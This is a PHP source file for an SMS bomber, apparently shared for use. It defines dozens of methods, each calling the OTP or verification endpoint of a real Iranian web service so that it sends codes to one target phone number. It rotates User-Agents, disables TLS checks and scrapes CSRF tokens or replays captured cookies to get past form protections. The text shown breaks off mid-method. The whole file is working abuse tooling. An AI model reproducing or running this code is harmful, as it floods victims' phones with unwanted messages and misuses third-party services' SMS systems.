<?php

/* coded by @parsa002am
date : 1401/02/02
class smsbomber002
 */
error_reporting(0);

class mbomber002
{
    private $Number;
    public function __construct($NUM)
    {
        $this->$Number = $NUM;
    }

    public function s002($lurl, $datas = [], $headers = [], $type = 1)
    {
        $ch = curl_init();
        
        // لیست User-Agentهای مختلف
        $userAgents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ];
        
        // انتخاب User-Agent رندوم
        $randomUserAgent = $userAgents[array_rand($userAgents)];
    
        // اضافه کردن User-Agent رندوم به هدرها
        $headers[] = 'User-Agent: ' . $randomUserAgent;
        $headers[] = 'Content-Type: application/json';
    
        curl_setopt($ch, CURLOPT_URL, $lurl);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
        if ($type == 1) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($datas, true));
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
        }
    
        return curl_exec($ch);
    }
    
    public function sg002($lurl, $headers = [])
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $lurl);
        $headers[] = 'Content-Type:application/json';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        

        return curl_exec($ch);
    }

}

class smsbomber002 extends mbomber002
{
    public function stapsi()
    {
        return $this->s002("https://api.tapsi.cab/api/v2/user", ["credential" => ["phoneNumber" => $this->$Number, "role" => "PASSENGER"]]);
    }
    public function Sbimebazar()
    {
        return $this->s002("https://bimebazar.com/accounts/api/login_sec/", ["username" => $this->$Number]);
    }
    public function Salopeyk()
    {
        return $this->s002("https://api.alopeyk.com/api/v2/login?platform=pwa-mobile", ["type" => "CUSTOMER", "model" => "Chrome 96.0.4664.45", "platform" => "pwa-mobile", "version" => "8.0.0", "manufacturer" => "Android", "isVirtual" => false, "serial" => true, "app_version" => "1.2.3", "uuid" => true, "phone" => $this->$Number]);
    }
    public function Sdivar()
    {
        return $this->s002("https://api.divar.ir/v5/auth/authenticate", ["phone" => $this->$Number]);
    }
    public function Snamava()
    {
        return $this->s002("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", ["UserName" => '+98' . $this->$Number]);
    }
    public function Sezpay()
    {
        return $this->s002("https://app.ezpay.ir:8443/open/v1/user/validation-code", ["phoneNumber" => $this->$Number]);
    }
    public function Sbazzar()
    {
        return $this->s002("https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", ["properties" => ["language" => 2, "clientID" => "dasda98dsajdb" . rand(100, 999), "deviceID" => "dasda98dsajdb" . rand(100, 999), "clientVersion" => "web"], "singleRequest" => ["getOtpTokenRequest" => ["username" => $this->$Number]]]);
    }
    public function Sdigikala()
    {
        return $this->s002("https://api.digikala.com/v1/user/authenticate/", ["username" => $this->$Number]);
    }
    public function Sbimecom()
    {
        return $this->s002("https://restcore.bimeh.com/v1/authentication", ["MobileNumber" => $this->$Number], ["token: da4aa2f8-70d9-4d56-b577-3162dfae2c0f"]);
    }
    public function Ssnapp()
    {
        return $this->s002("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", ["cellphone" => $this->$Number]);
    }
    public function Sbasalam()
    {
        return $this->s002("https://auth.basalam.com/otp-request", ["mobile" => $this->$Number]);
    }
    public function Ssnappmarket()
    {
        return $this->s002("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=" . $this->$Number);
    }
    public function Salibaba()
    {
        return $this->s002("https://ws.alibaba.ir/api/v3/account/mobile/otp", ["phoneNumber" => $this->$Number]);
    }
    public function Ssibche()
    {
        return $this->s002("https://api.sibche.com/profile/sendCode", ["mobile" => $this->$Number]);
    }
    public function Spezeshket()
    {
        return $this->s002("https://api.pezeshket.com/core/v1/auth/requestCode", ["mobileNumber" => $this->$Number]);
    }
    public function Ssnapptrip()
    {
        return $this->s002("https://www.snapptrip.com/register", ["lang"=>"fa","country_id"=>"860","password"=>"parsa.002.am","country_code"=>"+98","email"=>"parsa.002.am@gmail.com","mobile_phone" => $this->$Number]);
    }
    public function Schamedon()
    {
        return $this->s002("https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", ["mobile" => $this->$Number]);
    }
    public function Ssnappdoctor()
    {
        return $this->sg002("https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/".$this->$Number."/sms?cCode=+98");
    }
    public function Sgap()
    {
        return $this->sg002("https://core.gap.im/v1/user/add.json?mobile=".$this->$Number);
    }
    public function Strob()
    {
        return $this->sg002("https://api.torob.com/a/phone/send-pin/?phone_number=".$this->$Number);
      
    }
    public function Sbanimode()
    {
        return $this->s002("https://mobapi.banimode.com/api/v2/auth/request", ["phone" => $this->$Number]);
      
    }
    public function Sbehtarino()
    {
        return $this->s002("https://api.behtarino.com/api/v1/users/phone_verification/", ["phone" => $this->$Number]);
      
    }
    public function Ssheypoor()
    {
        return $this->s002("https://www.sheypoor.com/api/v10.0.0/auth/send", ["username" => $this->$Number]);
      
    }
    public function Skilid()
    {
        return $this->s002("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", ["mobile" => $this->$Number]);
      
    }
    public function Sshabesh()
    {
        return $this->s002("https://api.shabesh.com/api/checknumber", ["mobile" => $this->$Number]);
      
    }
    public function S2nabsh()
    {
        return $this->s002("https://api.2nabsh.com/v1/verifications/send", ["mobile" => $this->$Number],["client-token: 598eec18374b5"]);
      
    }
    public function Sshab()
    {
        return $this->s002("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", ["mobile" => $this->$Number]);
      
    }
    public function Ssinamatiket()
    {
        return $this->s002("https://cinematicket.org/api/v1/users/signup", ["phone_number" => $this->$Number]);
      
    }
    public function Sirantiket()
    {
        return $this->s002("https://www.irantic.com//api/login/request", ["mobile" => $this->$Number]);
      
    }
    public function Ssabziman()
    {
        return $this->s002("https://sabziman.com/wp-admin/admin-ajax.php", "action=newphoneexist&phonenumber=".$this->$Number,["content-type: application/x-www-form-urlencoded; charset=UTF-8"],0);
      
    }
    public function Sbrozmart()
    {
        return $this->s002("https://api.beroozmart.com/api/pub/account/send-otp", ["mobile" => $this->$Number ,"sendViaSms"=>true ,"email"=> null,"sendViaEmail"=>false]);
      
    }
    public function Szarinpall()
    {
        return $this->s002("https://next.zarinpal.com/api/oauth/initialize", ["username" => $this->$Number]);
      
    }
    public function Saghayedaro() {
        // مرحله ۱: دریافت HTML صفحه لاگین برای گرفتن توکن
        $url = "https://aghayedaro.com/users/login";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");     // ذخیره کوکی‌ها
        curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");    // استفاده از کوکی‌ها
        $html = curl_exec($ch);
        curl_close($ch);
    
        // مرحله ۲: استخراج مقدار _token از HTML
        if (preg_match('/<input[^>]+name="_token"[^>]+value="([^"]+)"/', $html, $matches)) {
            $token = $matches[1];
            
    
            // شماره‌ای که می‌خوای ارسال بشه
            $postData = [
                '_token' => $token,
                'mobile' => $this->$Number // از ویژگی Number برای شماره وارد شده استفاده می‌کنیم
            ];
    
            // مرحله ۳: ارسال توکن و شماره موبایل
            $ch = curl_init($url); // همون URL قبلی
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
            curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
            curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // اگه ریدایرکت باشه، دنبال کنه
            $response = curl_exec($ch);
            curl_close($ch);
            
       
        } else {
            die("❌ نتونستم توکن پیدا کنم!");
        }
    }
    public function joordaroo()
    {
        return $this->s002("https://gateway.joordaroo.com/lgc/v1/auth/request-otp", ["mobile" => $this->$Number]);
      
    }
    public function basalam()
    {
        return $this->s002("https://auth.basalam.com/captcha/otp-request", ["mobile" => $this->$Number , "client_id"=>"11"]);
      
    }

    public function bargheman()
    {
        return $this->s002("https://uiapi2.saapa.ir/api/otp/sendCode", ["mobile" => $this->$Number ,"from_meter_buy"=>false]);
      
    }
    public function send_sms_okcs() {
        $url = "https://okcs.com/users/mobilelogin";
    
        $user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0",
        ];
    
        $random_user_agent = $user_agents[array_rand($user_agents)]; // رندوم انتخاب کن
    
        $headers = [
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "Origin: https://okcs.com",
            "Referer: https://okcs.com/",
            "X-Requested-With: XMLHttpRequest",
            "User-Agent: $random_user_agent"
        ];
    
        $data = http_build_query([
            "mobile" => $this->$Number,
            "url" => "https://okcs.com/"
        ]);
    
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $response = curl_exec($ch);
        curl_close($ch);
    
       
    }

    public function mobilexpress()
    {
        $url = "https://mobilexpress.ir/wp-admin/admin-ajax.php";
    
        $data = [
            'login_digt_countrycode' => '+98',
            'digits_phone' => $this->$Number, // اینجا درستش کردم، یه $ اضافی برداشتم
            'action_type' => 'phone',
            'digits_reg_name' => 'motalb',
            'digits_process_register' => '1',
            'sms_otp' => '',
            'digits_otp_field' => '1',
            'digits' => '1',
            'instance_id' => 'c927ca8a3e5e41f876469cc7062886ec',
            'action' => 'digits_forms_ajax',
            'type' => 'login',
            'digits_step_1_type' => '',
            'digits_step_1_value' => '',
            'digits_step_2_type' => '',
            'digits_step_2_value' => '',
            'digits_step_3_type' => '',
            'digits_step_3_value' => '',
            'digits_login_email_token' => '',
            'digits_redirect_page' => '//mobilexpress.ir/',
            'digits_form' => 'a979ac24af',
            '_wp_http_referer' => '/',
            'show_force_title' => '1',
            'container' => 'digits_protected',
            'sub_action' => 'sms_otp'
        ];
    
        $headers = [
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://mobilexpress.ir',
            'Referer: https://mobilexpress.ir/',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'X-Requested-With: XMLHttpRequest'
        ];
    
        // حالا فراخوانی تابع عمومی s002
        return $this->s002($url, http_build_query($data), $headers, $type=2);
    }

    public function vitrin()
    {
        $url = "https://www.vitrin.shop/api/v1/user/request_code";
    
        // اطلاعات مورد نیاز در payload
        $data = array(
            "phone_number" => $this->$Number,
            "forgot_password" => false
        );
        
        // هدرها
        $headers = array(
            "Accept: application/json",
            "Content-Type: application/json",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "X-XSRF-TOKEN: eyJpdiI6IjduODc0ZzZjUUZSQlBQN1Q1L0dsWmc9PSIsInZhbHVlIjoiREttY3dUY1VUd0RUa08zbkc0S0Y5c29Sdi9Sb2VjOCtKcTNLL0EzdE1Na1padkwxa0hpaFZiVjFpbzV0VFB3SWVIV29uWExOUUdEUFJ4aWI5bWl6N3BrMFJPbEtPSDBPSnJhbHhwS2xidkxHck9uNmZUaDRjd2wxR2Y3bXVpT0giLCJtYWMiOiJhZDg4YWE3MDA1Y2I0YmViMzJkNTk5NjNhMjhjYTU3ZGMxODQzMTg5OGUzNGM2OWMyMTg1Y2IwYWZlZDNkNDE3IiwidGFnIjoiIn0",
            "X-Requested-With: XMLHttpRequest"
        );
    
        return $this->s002($url, $data, $headers);
    }

    public function inchand()
    {
        $url = "https://accounts.khanoumi.com/account/login/init";
    
        // اطلاعات مورد نیاز در payload
      
        
        // هدرها
        $headers = array(
            "Accept: application/json",
            "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytdFM7me44Fg06XXq"
        );
        $url = "https://app.inchand.com/api/v1/authentication/otp";
    
        $headers = [
        "accept: application/json, text/plain, */*",
        "accept-encoding: gzip, deflate, br, zstd",
        "accept-language: en-US,en;q=0.9",
        "content-type: application/json",
        "origin: https://inchand.com",
        "referer: https://inchand.com/",
        "sec-ch-ua: \"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
        "sec-ch-ua-mobile: ?0",
        "sec-ch-ua-platform: \"Windows\"",
        "sec-fetch-dest: empty",
        "sec-fetch-mode: cors",
        "sec-fetch-site: same-site",
        "x-requested-with: XMLHttpRequest",
        "x-xsrf-token: eyJpdiI6IktWUHNwUG1pTjNFSkhoSWtQYytTcWc9PSIsInZhbHVlIjoiL1JiRHlCOHp4RFlwMit3OXhmc1hVOWRWbHQ0T0FBOVgxdDNDNUpZd2F4VEJKaFdLY25CTUhXNVNJRWM3aCtFSVl3OWtHcXBDeEt1Ti9iaGNrT1h4cFpYRTFZZ3NGUWNrN2pRTDRXSEVOTElianBzamdHY0NBYmFCbFpqaE1xYysiLCJtYWMiOiIwNGQyNDZiYjYwZWM1OTg5NWQ5YTZkMDBmYzdhZmEzMTkxNmQ1ODgzZjM4ZDFjYmI1YmYyY2U3ZDQ3YzBjYjYzIiwidGFnIjoiIn0=",
        "checksum-token: 72766f4a-b6c7-4641-8df6-faae98773d80",
            ];
        $data = [
        "mobile" => $this->$Number
            ];
        return $this->s002($url, $data, $headers);
    }
    

    public function gruccia()
    {
        $url = "https://gruccia.ir/login?back=my-account";
    
        $headers = [
            "Accept: */*",
            "Accept-Encoding: gzip, deflate, br, zstd",
            "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,ar;q=0.6,nl;q=0.5",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "Origin: https://gruccia.ir",
            "Referer: https://gruccia.ir/login?back=my-account",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "X-Requested-With: XMLHttpRequest",
        ];
    
        $payload = [
            "id_customer" => "",
            "back" => "",
            "firstname" => "khald",
            "lastname" => "salhi",
            "password" => "hT46snSKw2x2ZP6",
            "action" => "register",
            "username" => $this->$Number,
            "back" => "my-account",
            "ajax" => "1",
        ];
    
        // تبدیل آرایه به فرمت فرم
        $postfields = http_build_query($payload);
    
        // CURL شروع
        $ch = curl_init();
    
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
        // اجرا و گرفتن پاسخ
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
    
       
    }


    public function mashadleather()
    {
            $url = 'https://www.mashadleather.com/Login?ReturnUrl=%2Fhistory';
        
            // شماره موبایل را مشخص کنید
            
        
            // شروع cURL session برای درخواست GET
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3');
            curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
        
            // دریافت محتوای صفحه
            $response = curl_exec($ch);
        
            // بررسی موفقیت دریافت صفحه
            
        
            // بستن cURL session برای GET
            curl_close($ch);
        
            // استفاده از DOMDocument برای بارگذاری محتوای HTML
            libxml_use_internal_errors(true);
            $doc = new DOMDocument();
            $doc->loadHTML($response);
        
            // جستجوی توکن در HTML
            $xpath = new DOMXPath($doc);
            $tokenNodes = $xpath->query("//input[@name='__RequestVerificationToken']");
        
            // استخراج مقدار توکن
            if ($tokenNodes->length > 0) {
                $token = $tokenNodes->item(0)->getAttribute('value');
               
        
                // حالا درخواست POST برای ارسال شماره موبایل
                $post_url = 'https://www.mashadleather.com/Login?ReturnUrl=%2Fhistory';
        
                // داده‌هایی که باید ارسال شوند
                $post_data = [
                    '__RequestVerificationToken' => $token,
                    'CellNumber' => $this->$Number
                ];
        
                // شروع cURL session برای ارسال POST
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $post_url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
                curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
                curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3');
        
                // ارسال درخواست POST
                $post_response = curl_exec($ch);
        
                // بررسی موفقیت ارسال درخواست POST
               
                // بستن cURL session برای POST
                curl_close($ch);
            } else {
               
            }
    }


    public function davidjonesonline()
    {
        $url = 'https://davidjonesonline.ir/api/v1/sessions/login_request';
        $data = array('mobile_phone' => $this->$Number);
        $headers = array(
            'Accept: application/json, text/plain, */*',
            'Accept-Encoding: gzip, deflate, br, zstd',
            'Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,ar;q=0.6,nl;q=0.5',
            'Content-Type: application/json',
            'Origin: https://davidjonesonline.ir',
            'Referer: https://davidjonesonline.ir/',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Cookie: gid=GA1.2.922230820.1745722455; _gat=1; _gcl_au=1.1.651632366.1745722455; _ga_63MFKT8MZK=GS1.1.1745722455.1.0.1745722455.0.0.0; _ga=GA1.1.1270490761.1745722455; analytics_campaign={"source":"google","medium":"organic"}; analytics_token=d746b34a-7dfb-b345-c204-9cda68646fd3; analytics_session_token=b9209fe8-b52f-63a6-fdbe-fbfb7934d3e8; yektanet_session_last_activity=4/27/2025; _yngt_iframe=1; _yngt=01JEA9KM47KD7Q9P2C7QZMB8GG'
        );
    
       
    
        return $this->s002($url, $data, $headers);
    }

    public function sensishopping()
    {
        $url = 'https://sensishopping.com/wp-admin/admin-ajax.php';
        
        $data = array(
            'action' => 'digits_check_mob',
            'countrycode' => '+98',
            'mobileNo' => $this->$Number,
            'csrf' => 'e28824a247',
            'login' => '1',
            'username' => '',
            'email' => '',
            'captcha' => '',
            'captcha_ses' => '',
            'digits' => '1',
            'json' => '1',
            'whatsapp' => '0',
            'dig_otp' => '',
            'dig_nounce' => 'e28824a247'
        );
        $post_data = http_build_query($data);
        
        $headers = array(
            'Accept' => '*/*',
            'Accept-Encoding' => 'gzip, deflate, br, zstd',
            'Accept-Language' => 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,ar;q=0.6,nl;q=0.5',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin' => 'https://sensishopping.com',
            'Referer' => 'https://sensishopping.com/?login=true&page=1&redirect_to=https%3A%2F%2Fsensishopping.com%2F',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'X-Requested-With' => 'XMLHttpRequest',
            'Cookie' => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-04-27%2003%3A19%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fsensishopping.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-04-27%2003%3A19%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fsensishopping.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29'
        );
        
        $ch = curl_init();
    
        // تنظیمات cURL
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        // ارسال درخواست و دریافت پاسخ
        $response = curl_exec($ch);
    
        // بررسی وضعیت پاسخ
        if(curl_errno($ch)) {
             curl_error($ch);
        } else {
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if ($http_code == 200) {
                // پاسخ JSON را پردازش می‌کنیم
                $response_data = json_decode($response, true);
                
            } else {
                $http_code;
            }
        }
    
        // بستن cURL
        curl_close($ch);
    }

    public function mrbilit()
    {
        return $this->sg002("https://auth.mrbilit.ir/api/Token/send?mobile=".$this->$Number);
    }
    public function masterkala()
    {
        $url = "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp";
        $data = [
            "phone" =>$this->$Number,
            "type" => "sendotp"
        ];
        
    
        $headers = [
            "Content-Type: text/plain;charset=UTF-8",
            "Origin: https://masterkala.com",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
        ];
        $ch = curl_init($url);

        // ست کردن تنظیمات cURL
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        // تبدیل آرایه به JSON
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        // ارسال درخواست
        $response = curl_exec($ch);
        
        // وضعیت درخواست
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        curl_close($ch);
    
        // حالا فراخوانی تابع عمومی s002
        
    }
    public function webpoosh()
    {
        $contextOptions = [
            "ssl" => [
                "verify_peer" => false,
                "verify_peer_name" => false,
            ],
        ];
        
        // مرحله 1: گرفتن صفحه لاگین و ذخیره سشن
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.webpoosh.com/login");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true); // برای گرفتن کوکی‌ها
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        $response = curl_exec($ch);
        
        // استخراج کوکی‌ها
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $response, $matches);
        $cookies = implode('; ', $matches[1]);
        
        // جدا کردن بدنه صفحه از هدر
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $body = substr($response, $header_size);
        
        curl_close($ch);
        
        // مرحله 2: پیدا کردن _token از HTML
        if (preg_match('/name="_token"\s+value="([^"]+)"/', $body, $match)) {
            $token = $match[1];
            
        } else {
            die("توکن پیدا نشد داخل HTML!");
        }
        
        // مرحله 3: ارسال شماره موبایل با توکن
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.webpoosh.com/register");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        $data = http_build_query([
            "_token" => $token,
            "cellphone" => $this->$Number,
        ]);
        
        $headers = [
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "Origin: https://www.webpoosh.com",
            "Referer: https://www.webpoosh.com/login",
            "X-Requested-With: XMLHttpRequest",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "Cookie: " . $cookies,
        ];
        
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $response = curl_exec($ch);
        
        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
    }
    public function hoomangold()
    {
        $url = 'https://hoomangold.com/panel/?endp=step-2';

        // دیتای POST
        $data = [
            'redirect_to' => '',
            'action' => 'nirweb_panel_login_form',
            'nirweb_panel_username' => $this->$Number,
        ];
        
        // تبدیل آرایه به فرمت www-form-urlencoded
        $postFields = http_build_query($data);
        
        // کوکی‌ها (توی درخواست تو بود)
        $cookie = 'sbjs_migrations=1418474375998%3D1; sbjs_first_add=...; PHPSESSID=u3snmt5410og2ldf03ph79rru4; unique_user_id=cc9cf5fc5eb3ddab7026b073bd22c4f9; ...'; // کوکی‌ها رو کامل بذار
        
        // تنظیم هدرها
        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding: gzip, deflate, br, zstd',
            'Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,ar;q=0.6,nl;q=0.5',
            'Cache-Control: max-age=0',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://hoomangold.com',
            'Referer: https://hoomangold.com/panel/',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Upgrade-Insecure-Requests: 1',
            'Cookie: ' . $cookie,
        ];
        
        // شروع cURL
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br'); // برای هندل کردن gzip
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // غیرفعال کردن چک SSL
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        $response = curl_exec($ch);
        
        if (curl_errno($ch)) {
            curl_error($ch);
        }
        
        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        
       
        
    }

    public function mofidteb()
    {
       
        $url = "https://www.mofidteb.com/api/auth/auth";
    
        // payload
        $data = [
            "terms_accepted" => true,
            "username" =>$this->$Number
        ];
        $jsonData = json_encode($data);
    
        // initialize cURL
        $ch = curl_init($url);
    
        // set cURL options
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
